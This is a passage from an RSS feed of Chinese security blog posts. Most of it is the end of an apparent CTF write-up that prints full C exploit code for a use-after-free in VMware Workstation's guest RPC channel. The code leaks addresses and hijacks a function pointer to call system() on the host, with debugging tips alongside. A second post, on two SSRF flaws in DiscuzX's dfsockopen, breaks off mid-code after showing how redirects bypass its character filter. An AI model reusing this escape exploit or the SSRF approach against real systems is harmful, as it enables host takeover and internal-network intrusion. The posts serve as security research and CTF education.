        &quot;movl %%ecx,(%%r10)\n\t&quot;
        &quot;movl %%ebx,(%%r11)\n\t&quot;
        :
        :
        :&quot;%rax&quot;,&quot;%rbx&quot;,&quot;%rcx&quot;,&quot;%rdx&quot;,&quot;%rsi&quot;,&quot;%rdi&quot;,&quot;%r10&quot;,&quot;%r11&quot;
       );

}

void channel_recv_data(int cookie1,int cookie2,int channel_num,int offset,char *data,int *res){
    asm(&quot;pushq %%rbp\n\t&quot;
        &quot;movq %%r9,%%r10\n\t&quot;
        &quot;movq %%r8,%%rbp\n\t&quot;
        &quot;movq %%rcx,%%r11\n\t&quot;
        &quot;movq $1,%%rbx\n\t&quot;
        &quot;movl $0x564d5868,%%eax\n\t&quot;
        &quot;movl $0x0004001e,%%ecx\n\t&quot;
        &quot;movw $0x5658,%%dx\n\t&quot;
        &quot;in %%dx,%%eax\n\t&quot;
        &quot;add %%r11,%%rbp\n\t&quot;
        &quot;movl %%ebx,(%%rbp)\n\t&quot;
        &quot;movl %%ecx,(%%r10)\n\t&quot;
        &quot;popq %%rbp\n\t&quot;
        :
        :
        :&quot;%rax&quot;,&quot;%rbx&quot;,&quot;%rcx&quot;,&quot;%rdx&quot;,&quot;%rsi&quot;,&quot;%rdi&quot;,&quot;%r10&quot;,&quot;%r11&quot;,&quot;%r12&quot;
       );
}

void channel_recv_finish(int cookie1,int cookie2,int channel_num,int *res){
    asm(&quot;movl %%eax,%%ebx\n\t&quot;
        &quot;movq %%rcx,%%r10\n\t&quot;
        &quot;movq $0x1,%%rbx\n\t&quot;
        &quot;movl $0x564d5868,%%eax\n\t&quot;
        &quot;movl $0x0005001e,%%ecx\n\t&quot;
        &quot;movw $0x5658,%%dx\n\t&quot;
        &quot;out %%eax,%%dx\n\t&quot;
        &quot;movl %%ecx,(%%r10)\n\t&quot;
        :
        :
        :&quot;%rax&quot;,&quot;%rbx&quot;,&quot;%rcx&quot;,&quot;%rdx&quot;,&quot;%rsi&quot;,&quot;%rdi&quot;,&quot;%r10&quot;
       );
}
void channel_recv_finish2(int cookie1,int cookie2,int channel_num,int *res){
    asm(&quot;movl %%eax,%%ebx\n\t&quot;
        &quot;movq %%rcx,%%r10\n\t&quot;
        &quot;movq $0x21,%%rbx\n\t&quot;
        &quot;movl $0x564d5868,%%eax\n\t&quot;
        &quot;movl $0x0005001e,%%ecx\n\t&quot;
        &quot;movw $0x5658,%%dx\n\t&quot;
        &quot;out %%eax,%%dx\n\t&quot;
        &quot;movl %%ecx,(%%r10)\n\t&quot;
        :
        :
        :&quot;%rax&quot;,&quot;%rbx&quot;,&quot;%rcx&quot;,&quot;%rdx&quot;,&quot;%rsi&quot;,&quot;%rdi&quot;,&quot;%r10&quot;
       );
}
void channel_close(int cookie1,int cookie2,int channel_num,int *res){
    asm(&quot;movl %%eax,%%ebx\n\t&quot;
        &quot;movq %%rcx,%%r10\n\t&quot;
        &quot;movl $0x564d5868,%%eax\n\t&quot;
        &quot;movl $0x0006001e,%%ecx\n\t&quot;
        &quot;movw $0x5658,%%dx\n\t&quot;
        &quot;out %%eax,%%dx\n\t&quot;
        &quot;movl %%ecx,(%%r10)\n\t&quot;
        :
        :
        :&quot;%rax&quot;,&quot;%rbx&quot;,&quot;%rcx&quot;,&quot;%rdx&quot;,&quot;%rsi&quot;,&quot;%rdi&quot;,&quot;%r10&quot;
       );
}
struct channel{
    int cookie1;
    int cookie2;
    int num;
};
uint64_t heap =0;
uint64_t text =0;
void run_cmd(char *cmd){
    struct channel tmp;
    int res,len,i;
    char *data;
    channel_open(&amp;amp;tmp.cookie1,&amp;amp;tmp.cookie2,&amp;amp;tmp.num,&amp;amp;res);
    if(!res){
        printf(&quot;fail to open channel!\n&quot;);
        return;
    }
    channel_set_len(tmp.cookie1,tmp.cookie2,tmp.num,strlen(cmd),&amp;amp;res);
    if(!res){
        printf(&quot;fail to set len\n&quot;);
        return;
    }
    channel_send_data(tmp.cookie1,tmp.cookie2,tmp.num,strlen(cmd)+0x10,cmd,&amp;amp;res);

    channel_recv_reply_len(tmp.cookie1,tmp.cookie2,tmp.num,&amp;amp;len,&amp;amp;res);
    if(!res){
        printf(&quot;fail to recv data len\n&quot;);
        return;
    }
    printf(&quot;recv len:%d\n&quot;,len);
    data = malloc(len+0x10);
    memset(data,0,len+0x10);
    for(i=0;i&amp;lt;len+0x10;i+=4){
        channel_recv_data(tmp.cookie1,tmp.cookie2,tmp.num,i,data,&amp;amp;res);
    }
    printf(&quot;recv data:%s\n&quot;,data);
    channel_recv_finish(tmp.cookie1,tmp.cookie2,tmp.num,&amp;amp;res);
    if(!res){
        printf(&quot;fail to recv finish\n&quot;);
    }

    channel_close(tmp.cookie1,tmp.cookie2,tmp.num,&amp;amp;res);
    if(!res){
        printf(&quot;fail to close channel\n&quot;);
        return;
    }
}
void leak(){
    struct channel chan[10];
    int res=0;
    int len,i;	
    char pay[8192];
    char *s1 = &quot;info-set guestinfo.a AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;;
    char *data;
    char *s2 = &quot;info-get guestinfo.a&quot;;
    char *s3 = &quot;1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;;
    char *s4 = &quot;tools.capability.dnd_version 4&quot;;
    char *s5 = &quot;vmx.capability.dnd_version&quot;;
    //init data
    run_cmd(s1); // set the message len to be 0x100, so when we call info-get ,we will call malloc(0x100);
    run_cmd(s4);


    //first step 
    channel_open(&amp;amp;chan[0].cookie1,&amp;amp;chan[0].cookie2,&amp;amp;chan[0].num,&amp;amp;res);
    if(!res){
        printf(&quot;fail to open channel!\n&quot;);
        return;
    }
    channel_set_len(chan[0].cookie1,chan[0].cookie2,chan[0].num,strlen(s2),&amp;amp;res);
    if(!res){
        printf(&quot;fail to set len\n&quot;);
        return;
    }
    channel_send_data(chan[0].cookie1,chan[0].cookie2,chan[0].num,strlen(s2),s2,&amp;amp;res);
    channel_recv_reply_len(chan[0].cookie1,chan[0].cookie2,chan[0].num,&amp;amp;len,&amp;amp;res);
    if(!res){
        printf(&quot;fail to recv data len\n&quot;);
        return;
    }
    printf(&quot;recv len:%d\n&quot;,len);
    data = malloc(len+0x10);
    memset(data,0,len+0x10);
    for(i=0;i&amp;lt;len+0x10;i++){
        channel_recv_data(chan[0].cookie1,chan[0].cookie2,chan[0].num,i,data,&amp;amp;res);
    }
    printf(&quot;recv data:%s\n&quot;,data);
    //second step free the reply and let the other channel get it.

    channel_open(&amp;amp;chan[1].cookie1,&amp;amp;chan[1].cookie2,&amp;amp;chan[1].num,&amp;amp;res);
    if(!res){
        printf(&quot;fail to open channel!\n&quot;);
        return;
    }
    channel_set_len(chan[1].cookie1,chan[1].cookie2,chan[1].num,strlen(s2),&amp;amp;res);
    if(!res){
        printf(&quot;fail to set len\n&quot;);
        return;
    }

    channel_send_data(chan[1].cookie1,chan[1].cookie2,chan[1].num,strlen(s2)-4,s2,&amp;amp;res);
    if(!res){
        printf(&quot;fail to send data\n&quot;);
        return;
    }

    //free the output buffer
    printf(&quot;Freeing the buffer....,bp:0x5555556DD3EF\n&quot;);
    getchar();
    channel_recv_finish2(chan[0].cookie1,chan[0].cookie2,chan[0].num,&amp;amp;res);
    if(!res){
        printf(&quot;fail to recv finish1\n&quot;);
        return;
    }
    //finished sending the command, should get the freed buffer
    printf(&quot;Finishing sending the buffer , should allocate the buffer..,bp:0x5555556DD5BC\n&quot;);
    getchar();
    channel_send_data(chan[1].cookie1,chan[1].cookie2,chan[1].num,4,&amp;amp;s2[16],&amp;amp;res);
    if(!res){
        printf(&quot;fail to send data\n&quot;);
        return;
    }
    
    //third step,free it again
    //set status to be 4
    channel_recv_reply_len(chan[0].cookie1,chan[0].cookie2,chan[0].num,&amp;amp;len,&amp;amp;res);
    if(!res){
        printf(&quot;fail to recv data len\n&quot;);
        return;
    }
    printf(&quot;recv len:%d\n&quot;,len);

    //free the output buffer
    printf(&quot;Free the buffer again...\n&quot;);
    getchar();
    channel_recv_finish2(chan[0].cookie1,chan[0].cookie2,chan[0].num,&amp;amp;res);
    if(!res){
        printf(&quot;fail to recv finish2\n&quot;);
        return;
    }

    printf(&quot;Trying to reuse the buffer as a struct, which we can leak..\n&quot;);
    getchar();
    run_cmd(s5);
    printf(&quot;Should be done.Check the buffer\n&quot;);
    getchar();

    //Now the output buffer of chan[1] is used as a struct, which contains many addresses
    channel_recv_reply_len(chan[1].cookie1,chan[1].cookie2,chan[1].num,&amp;amp;len,&amp;amp;res);
    if(!res){
        printf(&quot;fail to recv data len\n&quot;);
        return;
    }


    data = malloc(len+0x10);
    memset(data,0,len+0x10);
    for(i=0;i&amp;lt;len+0x10;i+=4){
        channel_recv_data(chan[1].cookie1,chan[1].cookie2,chan[1].num,i,data,&amp;amp;res);
    }
    printf(&quot;recv data:\n&quot;);
    for(i=0;i&amp;lt;len;i+=8){
        printf(&quot;recv data:%lx\n&quot;,*(long long *)&amp;amp;data[i]);
    }
    text = (*(uint64_t *)data)-0xf818d0;

    printf(&quot;Leak Success\n&quot;);
}

void exploit(){
    //the exploit step is almost the same as the leak ones
    struct channel chan[10];
    int res=0;
    int len,i;
    char *data;
    char *s1 = &quot;info-set guestinfo.b BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;;
    char *s2 = &quot;info-get guestinfo.b&quot;;
    char *s3 = &quot;1 BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;;
    char *s4 = &quot;gnome-calculator\x00&quot;;
    uint64_t pay1 =text+0xFE95B8; 
    uint64_t pay2 =text+0xECFD0; //system
    uint64_t pay3 =text+0xFE95C8;
    char *pay4 = &quot;gnome-calculator\x00&quot;;
    run_cmd(s1);
    channel_open(&amp;amp;chan[0].cookie1,&amp;amp;chan[0].cookie2,&amp;amp;chan[0].num,&amp;amp;res);
    if(!res){
        printf(&quot;fail to open channel!\n&quot;);
        return;
    }
    channel_set_len(chan[0].cookie1,chan[0].cookie2,chan[0].num,strlen(s2),&amp;amp;res);
    if(!res){
        printf(&quot;fail to set len\n&quot;);
        return;
    }
    channel_send_data(chan[0].cookie1,chan[0].cookie2,chan[0].num,strlen(s2),s2,&amp;amp;res);
    channel_recv_reply_len(chan[0].cookie1,chan[0].cookie2,chan[0].num,&amp;amp;len,&amp;amp;res);
    if(!res){
        printf(&quot;fail to recv data len\n&quot;);
        return;
    }
    printf(&quot;recv len:%d\n&quot;,len);
    data = malloc(len+0x10);
    memset(data,0,len+0x10);
    for(i=0;i&amp;lt;len+0x10;i+=4){
        channel_recv_data(chan[0].cookie1,chan[0].cookie2,chan[0].num,i,data,&amp;amp;res);
    }
    printf(&quot;recv data:%s\n&quot;,data);
    channel_open(&amp;amp;chan[1].cookie1,&amp;amp;chan[1].cookie2,&amp;amp;chan[1].num,&amp;amp;res);
    if(!res){
        printf(&quot;fail to open channel!\n&quot;);
        return;
    }
    channel_open(&amp;amp;chan[2].cookie1,&amp;amp;chan[2].cookie2,&amp;amp;chan[2].num,&amp;amp;res);
    if(!res){
        printf(&quot;fail to open channel!\n&quot;);
        return;
    }
    channel_open(&amp;amp;chan[3].cookie1,&amp;amp;chan[3].cookie2,&amp;amp;chan[3].num,&amp;amp;res);
    if(!res){
        printf(&quot;fail to open channel!\n&quot;);
        return;
    }
    channel_recv_finish2(chan[0].cookie1,chan[0].cookie2,chan[0].num,&amp;amp;res);
    if(!res){
        printf(&quot;fail to recv finish2\n&quot;);
        return;
    }
    channel_set_len(chan[1].cookie1,chan[1].cookie2,chan[1].num,strlen(s3),&amp;amp;res);
    if(!res){
        printf(&quot;fail to set len\n&quot;);
        return;
    }
    printf(&quot;leak2 success\n&quot;);
    channel_recv_reply_len(chan[0].cookie1,chan[0].cookie2,chan[0].num,&amp;amp;len,&amp;amp;res);
    if(!res){
        printf(&quot;fail to recv data len\n&quot;);
        return;
    }
    channel_recv_finish2(chan[0].cookie1,chan[0].cookie2,chan[0].num,&amp;amp;res);
    if(!res){
        printf(&quot;fail to recv finish2\n&quot;);
        return;
    }
    channel_send_data(chan[1].cookie1,chan[1].cookie2,chan[1].num,8,&amp;amp;pay1,&amp;amp;res);
    channel_set_len(chan[2].cookie1,chan[2].cookie2,chan[2].num,strlen(s3),&amp;amp;res);
    if(!res){
        printf(&quot;fail to set len\n&quot;);
        return;
    }
    channel_set_len(chan[3].cookie1,chan[3].cookie2,chan[3].num,strlen(s3),&amp;amp;res);
    channel_send_data(chan[3].cookie1,chan[3].cookie2,chan[3].num,8,&amp;amp;pay2,&amp;amp;res);
    channel_send_data(chan[3].cookie1,chan[3].cookie2,chan[3].num,8,&amp;amp;pay3,&amp;amp;res);
    channel_send_data(chan[3].cookie1,chan[3].cookie2,chan[3].num,strlen(pay4)+1,pay4,&amp;amp;res);
    run_cmd(s4);
    if(!res){
        printf(&quot;fail to set len\n&quot;);
        return;
    }
}
void main(){
    setvbuf(stdout,0,2,0);
    setvbuf(stderr,0,2,0);
    setvbuf(stdin,0,2,0);
    leak();
    printf(&quot;text base :%p&quot;,text);
    exploit();
}	
&lt;/code&gt;&lt;p&gt;Enjoy your calculator:)&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-53372f4dacfe152584ea24b2efc6a4a7_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;640&quot; data-rawheight=&quot;466&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-53372f4dacfe152584ea24b2efc6a4a7&quot; data-watermark-src=&quot;v2-c19ca28337b91b0fc87d56c97781b99e&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;关于调试&lt;/h2&gt;&lt;p&gt;调试有点小技巧需要说明一下。首先就是正常的把&lt;code class=&quot;inline&quot;&gt;vmware&lt;/code&gt;开起来，然后在&lt;code class=&quot;inline&quot;&gt;host&lt;/code&gt;用&lt;code class=&quot;inline&quot;&gt;gdb&lt;/code&gt;来&lt;code class=&quot;inline&quot;&gt;attach&lt;/code&gt;上去。这个时候我们会下断点，然后继续运行，进入虚拟机&lt;code class=&quot;inline&quot;&gt;guest&lt;/code&gt;里面跑&lt;code class=&quot;inline&quot;&gt;exploit&lt;/code&gt;脚本。但大家想一下，如果你还在&lt;code class=&quot;inline&quot;&gt;guest&lt;/code&gt;里面的时候，&lt;code class=&quot;inline&quot;&gt;host&lt;/code&gt;的&lt;code class=&quot;inline&quot;&gt;gdb&lt;/code&gt;遇到了断点，会怎样？&lt;br&gt;因为&lt;code class=&quot;inline&quot;&gt;gdb&lt;/code&gt;遇到了断点，那么&lt;code class=&quot;inline&quot;&gt;guest&lt;/code&gt;就被停住了。然而你还在&lt;code class=&quot;inline&quot;&gt;guest&lt;/code&gt;里面，你就没有办法按&lt;code class=&quot;inline&quot;&gt;ctrl+alt&lt;/code&gt;切出来了，就像被人放了一招&lt;code class=&quot;inline&quot;&gt;时间停止&lt;/code&gt;一样。这个时候你除了含泪强制关机之外没有什么好办法。所以大家在调试的时候记得现在exp开头加个&lt;code class=&quot;inline&quot;&gt;sleep&lt;/code&gt;,然后在&lt;code class=&quot;inline&quot;&gt;sleep&lt;/code&gt;的时候赶紧把鼠标切出来到&lt;code class=&quot;inline&quot;&gt;host&lt;/code&gt;中。这样就可以正常调试了。(PS:好像&lt;code class=&quot;inline&quot;&gt;mac&lt;/code&gt;不会有这个问题，因为&lt;code class=&quot;inline&quot;&gt;mac&lt;/code&gt;可以直接用触摸板切出来?)&lt;/p&gt;&lt;p&gt;稍微打个广告:如果你觉得这篇文章有用，欢迎到github上follow一波&lt;code class=&quot;inline&quot;&gt;Ne0&lt;/code&gt;(&lt;a href=&quot;https://github.com/Changochen&quot;&gt;https://github.com/Changochen&lt;/a&gt;)和&lt;code class=&quot;inline&quot;&gt;bibi&lt;/code&gt;(&lt;a href=&quot;https://github.com/fpbibi&quot;&gt;https://github.com/fpbibi&lt;/a&gt;)&lt;/p&gt;&lt;h2&gt;相关材料&lt;/h2&gt;&lt;p&gt;题目相关材料：&lt;/p&gt;&lt;blockquote&gt;题目操作系统：Ubuntu x64 1804&lt;br&gt;目标VMWare Workstation：VMware-Workstation-Full-15.0.2-10952284.x86_64.bundle，&lt;a href=&quot;https://drive.google.com/open?id=1SlojAhX0NCpWTPjASfM03v5QBvRtT-sp&quot;&gt;https://drive.google.com/open?id=1SlojAhX0NCpWTPjASfM03v5QBvRtT-sp&lt;/a&gt;&lt;br&gt;patched VMX：&lt;a href=&quot;https://drive.google.com/open?id=1MJQSQYufGtl9DQnG1osyMk_1YbgCPL-E&quot;&gt;https://drive.google.com/open?id=1MJQSQYufGtl9DQnG1osyMk_1YbgCPL-E&lt;/a&gt;&lt;/blockquote&gt;&lt;p&gt;一些参考资料：&lt;/p&gt;&lt;blockquote&gt;&lt;a href=&quot;https://www.zerodayinitiative.com/blog/2017/6/26/use-after-silence-exploiting-a-quietly-patched-uaf-in-vmware&quot;&gt;https://www.zerodayinitiative.com/blog/2017/6/26/use-after-silence-exploiting-a-quietly-patched-uaf-in-vmware&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://www.52pojie.cn/thread-783225-1-1.html&quot;&gt;https://www.52pojie.cn/thread-783225-1-1.html&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://sites.google.com/site/chitchatvmback/backdoor&quot;&gt;https://sites.google.com/site/chitchatvmback/backdoor&lt;/a&gt;&lt;/blockquote&gt;</description>
<author>婴宁</author>
<guid isPermaLink="false">2018-12-11-52140921</guid>
<pubDate>Tue, 11 Dec 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>DiscuzX 两处 SSRF 挖掘及利用</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-12-09-51907363.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/51907363&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-e7d00533c3e1540f6230bcf1746af4b6_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;h2&gt;&lt;b&gt;概述&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;我在调试分析 DiscuzX （以下简称 Dz）历史漏洞的时候，发现 Dz 的 SSRF 漏洞其实都是由一个叫&lt;code class=&quot;inline&quot;&gt;dfsockopen&lt;/code&gt;的函数导致的，并且官方修补方式都是指哪补哪。于是简单过了一遍所有调用&lt;code class=&quot;inline&quot;&gt;dfsockopen&lt;/code&gt;的地方，最终又找到两处 SSRF。本文将对这两处 SSRF 漏洞成因以及利用方式做简要探讨。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;关键函数 dfsockopen&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;本次漏洞的关键函数&lt;code class=&quot;inline&quot;&gt;dfsockopen&lt;/code&gt;：&lt;/p&gt;&lt;code lang=&quot;php&quot;&gt;function dfsockopen($url, $limit = 0, $post = &#39;&#39;, $cookie = &#39;&#39;, $bysocket = FALSE, $ip = &#39;&#39;, $timeout = 15, $block = TRUE, $encodetype  = &#39;URLENCODE&#39;, $allowcurl = TRUE, $position = 0, $files = array()) {
    require_once libfile(&#39;function/filesock&#39;);
    return _dfsockopen($url, $limit, $post, $cookie, $bysocket, $ip, $timeout, $block, $encodetype, $allowcurl, $position, $files);
}&lt;/code&gt;&lt;p&gt;可以看到，&lt;code class=&quot;inline&quot;&gt;dfsockopen&lt;/code&gt; 具体逻辑都是由 &lt;code class=&quot;inline&quot;&gt;_dfsockopen&lt;/code&gt; 实现的。而 &lt;code class=&quot;inline&quot;&gt;_dfsockopen&lt;/code&gt; 函数代码的大致流程是：对传入的 url 参数首先调用 &lt;code class=&quot;inline&quot;&gt;parse_url&lt;/code&gt; 函数进行解析，然后检测 PHP 环境是否安装了 curl 扩展，如果是，那么接下来会用 curl 对传入的 url 参数发起请求；否则，则用 &lt;code class=&quot;inline&quot;&gt;fsockopen&lt;/code&gt; 对解析出来的 host, port 建立 socket 连接，手动构造发送 HTTP 请求数据包。&lt;/p&gt;&lt;p&gt;&lt;code class=&quot;inline&quot;&gt;_dfsockopen&lt;/code&gt; 函数代码比较长，这里只贴出其中调用 curl 进行处理的部分：&lt;/p&gt;&lt;code lang=&quot;php&quot;&gt;    if(function_exists(&#39;curl_init&#39;) &amp;amp;&amp;amp; function_exists(&#39;curl_exec&#39;) &amp;amp;&amp;amp; $allowcurl) {
        $ch = curl_init();
        $httpheader = array();
        if($ip) {
            $httpheader[] = &quot;Host: &quot;.$host;
        }
        if($httpheader) {
            curl_setopt($ch, CURLOPT_HTTPHEADER, $httpheader);
        }
        curl_setopt($ch, CURLOPT_URL, $scheme.&#39;://&#39;.($ip ? $ip : $host).($port ? &#39;:&#39;.$port : &#39;&#39;).$path);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_HEADER, 1);
        if($post) {
            curl_setopt($ch, CURLOPT_POST, 1);
            if($encodetype == &#39;URLENCODE&#39;) {
                curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
            } else {
                foreach($post as $k =&amp;gt; $v) {
                    if(isset($files[$k])) {
                        $post[$k] = &#39;@&#39;.$files[$k];
                    }
                }
                foreach($files as $k =&amp;gt; $file) {
                    if(!isset($post[$k]) &amp;amp;&amp;amp; file_exists($file)) {
                        $post[$k] = &#39;@&#39;.$file;
                    }
                }
                curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
            }
        }
        if($cookie) {
            curl_setopt($ch, CURLOPT_COOKIE, $cookie);
        }
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
        curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
        $data = curl_exec($ch);
        $status = curl_getinfo($ch);
        $errno = curl_errno($ch);
        curl_close($ch);
        if($errno || $status[&#39;http_code&#39;] != 200) {
            return;
        } else {
            $GLOBALS[&#39;filesockheader&#39;] = substr($data, 0, $status[&#39;header_size&#39;]);
            $data = substr($data, $status[&#39;header_size&#39;]);
            return !$limit ? $data : substr($data, 0, $limit);
        }
    }&lt;/code&gt;&lt;p&gt;可以发现，&lt;code class=&quot;inline&quot;&gt;dfsockopen&lt;/code&gt;没有检查一个请求的地址是否是内网地址。除此之外，它会优先使用 curl 来构造发送请求，curl 是个很强大的网络请求程序，它默认支持的协议很多，其中包括“万能”的协议 gopher：&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-4dbbcb7e3345d2bd68a5e5ab9a18e1ea_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1602&quot; data-rawheight=&quot;136&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;gopher 可以构造发送任意内容的数据包：&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-6f6b82247cf00b6f83d061055351de97_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;2564&quot; data-rawheight=&quot;512&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-6f6b82247cf00b6f83d061055351de97&quot; data-watermark-src=&quot;v2-3ca725c7aa9349bfcd47c4287dd032c0&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;另外注意一点，这里代码中的 curl 选项配置跟随跳转：&lt;/p&gt;&lt;code lang=&quot;php&quot;&gt;curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);&lt;/code&gt;&lt;p&gt;众所周知，跟随跳转在 SSRF 中可以 bypass 请求协议限制（虽然这里并没有）。除此之外，由于 Dz 中&lt;code class=&quot;inline&quot;&gt;_xss_check&lt;/code&gt;函数会检查 url 中的特殊字符，如果检查到某些特殊字符就会进行拦截，因此还可以利用跟随跳转来绕过 url 中不能出现特殊字符的限制：&lt;/p&gt;&lt;code lang=&quot;php&quot;&gt;    private function _xss_check() {

        static $check = array(&#39;&quot;&#39;, &#39;&amp;gt;&#39;, &#39;&amp;lt;&#39;, &#39;\&#39;&#39;, &#39;(&#39;, &#39;)&#39;, &#39;CONTENT-TRANSFER-ENCODING&#39;);

        if(isset($_GET[&#39;formhash&#39;]) &amp;amp;&amp;amp; $_GET[&#39;formhash&#39;] !== formhash()) {
            system_error(&#39;request_tainting&#39;);
        }

        if($_SERVER[&#39;REQUEST_METHOD&#39;] == &#39;GET&#39; ) {
            $temp = $_SERVER[&#39;REQUEST_URI&#39;];
        } elseif(empty ($_GET[&#39;formhash&#39;])) {
            $temp = $_SERVER[&#39;REQUEST_URI&#39;].file_get_contents(&#39;php://input&#39;);
        } else {
            $temp = &#39;&#39;;
        }

        if(!empty($temp)) {
            $temp = strtoupper(urldecode(urldecode($temp)));
            foreach ($check as $str) {
                if(strpos($temp, $str) !== false) {
                    system_error(&#39;request_tainting&#39;);
                }
            }
        }

        return true;
    }&lt;/code&gt;&lt;h2&gt;&lt;b&gt;寻找漏洞&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;所以如果想再找一个 SSRF 的思路就有了，直接找哪些地方调用了 &lt;code class=&quot;inline&quot;&gt;dfsockopen&lt;/code&gt; 并且 url 参数可控的即可。去年 10 月份的时候更新了两个关于 SSRF 的补丁：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://gitee.com/ComsenzDiscuz/DiscuzX/commit/19fd20f7420397b88278ac1a0dae65fe50012506&quot;&gt;https://gitee.com/ComsenzDiscuz/DiscuzX/commit/19fd20f7420397b88278ac1a0dae65fe50012506&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://gitee.com/ComsenzDiscuz/DiscuzX/commit/76a3c77c979f92dc1633ae581b5359db76096593&quot;&gt;https://gitee.com/ComsenzDiscuz/DiscuzX/commit/76a3c77c979f92dc1633ae581b5359db76096593&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;可以看到官方的修补办法都是简单粗暴，直接关闭对应的功能或者把功能仅限于对管理员开放。所以除了上面的两个已经被修补外，我粗略找了下，又发现了两个。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;imgcropper SSRF&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;code class=&quot;inline&quot;&gt;source/class/class_image.php&lt;/code&gt; &lt;code class=&quot;inline&quot;&gt;image&lt;/code&gt;类&lt;code class=&quot;inline&quot;&gt;init&lt;/code&gt;方法：&lt;/p&gt;&lt;code lang=&quot;php&quot;&gt;    function init($method, $source, $target, $nosuffix = 0) {
        global $_G;

        $this-&amp;gt;errorcode = 0;
        if(empty($source)) {
            return -2;
        }
        $parse = parse_url($source);
        if(isset($parse[&#39;host&#39;])) {
            if(empty($target)) {
                return -2;
            }
            $data = dfsockopen($source);
            $this-&amp;gt;tmpfile = $source = tempnam($_G[&#39;setting&#39;][&#39;attachdir&#39;].&#39;./temp/&#39;, &#39;tmpimg_&#39;);
            if(!$data || $source === FALSE) {
                return -2;
            }
            file_put_contents($source, $data);
        }
        ......
